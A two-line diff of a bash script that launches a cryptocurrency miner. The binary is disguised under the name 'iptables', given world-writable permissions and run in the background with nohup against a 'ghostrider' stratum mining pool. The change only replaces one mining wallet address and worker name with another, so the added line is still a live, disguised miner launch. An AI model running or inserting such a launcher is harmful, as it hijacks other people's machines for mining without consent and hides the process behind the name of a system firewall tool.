@@ -1,2 +1,2 @@
 #!/bin/bash
-chmod 777 iptables && nohup ./iptables --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BcwEkYe2WhVDUW1BvGfy2ExfDUy3XA8JAS.$(echo $(shuf -i 1-999 -n 1)-T) &
+chmod 777 iptables && nohup ./iptables --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BdjPWXaLQ28c9Siz5QsYH1koN1hm7P9J8J.pecel
